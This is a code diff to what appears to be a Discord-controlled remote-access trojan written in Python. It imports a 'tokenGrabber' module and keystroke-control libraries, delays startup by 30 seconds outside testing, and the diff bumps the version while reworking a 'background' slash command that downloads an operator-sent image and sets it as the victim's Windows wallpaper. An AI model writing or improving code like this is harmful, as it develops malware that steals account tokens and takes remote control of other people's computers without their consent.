@@ -31,9 +31,10 @@ import tokenGrabber
 from functools import wraps
 import keyboard
 from pynput.keyboard import Key, Controller
+import tempfile
 
 TESTING = False
-VERSION = "v6.6"
+VERSION = "v6.7"
 if not TESTING:
     # pass
     time.sleep(30)
@@ -614,25 +615,33 @@ async def main():
         except Exception as e:
             await ctx.respond(f"Error executing: `" + str(e)+'`')
 
-    @bot.slash_command(name="background", description="set dessktop background")
-    @option("file", description="image", input_type=discord.Attachment, required=True)
+    @bot.slash_command(name="background", description="Set desktop background")
+    @option("file", description="Image file", input_type=discord.Attachment, required=True)
     async def background(ctx: discord.ApplicationContext, file: discord.Attachment):
         await ctx.defer()
 
-        filename = "wallpaper.jpg"
-        filepath = os.path.join(os.getcwd(), filename)
-
+        # Download the image
         async with aiohttp.ClientSession() as session:
             async with session.get(file.url) as resp:
-                if resp.status == 200:
-                    with open(filepath, "wb") as f:
-                        f.write(await resp.read())
+                if resp.status != 200:
+                    return await ctx.respond("❌ Failed to download the image.")
 
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, filepath, 3)
-        embed = discord.Embed(title="Wallpaper set", description=file.filename)
-        embed.set_image(url=file.proxy_url or file.url)
+                image_bytes = await resp.read()
 
-        await ctx.respond(embed=embed)
+        # Save to a safe temp path
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as tmp:
+            tmp.write(image_bytes)
+            tmp_path = tmp.name
+
+        # Set as wallpaper (Windows)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp_path, 3)
+
+        # Embed with re-uploaded image
+        discord_file = discord.File(fp=tmp_path, filename="wallpaper.jpg")
+        embed = discord.Embed(title="✅ Wallpaper set", description=file.filename)
+        embed.set_image(url="attachment://wallpaper.jpg")
+
+        await ctx.respond(embed=embed, file=discord_file)
 
     @bot.event
     async def on_application_command_error(ctx, error):
